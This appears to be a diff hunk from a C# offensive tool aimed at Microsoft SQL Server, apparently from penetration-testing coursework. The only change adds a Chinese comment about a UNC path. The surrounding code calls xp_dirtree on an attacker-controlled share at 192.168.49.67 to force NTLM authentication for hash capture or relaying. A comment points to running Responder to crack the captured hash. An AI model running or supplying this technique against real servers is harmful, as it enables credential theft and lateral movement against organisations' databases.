@@ -66,7 +66,7 @@ namespace MSSQL
 			getGroupMembership("sysadmin", con);
 
 			// Force NTLM authentication for hash-grabbing or relaying
-			String targetShare = "\\\\192.168.49.67\\share";
+			String targetShare = "\\\\192.168.49.67\\share";//通用命名約定 (UNC) 路徑
 			String res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
 			Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");//responser打爆破(sudo responder -I tun0)
 
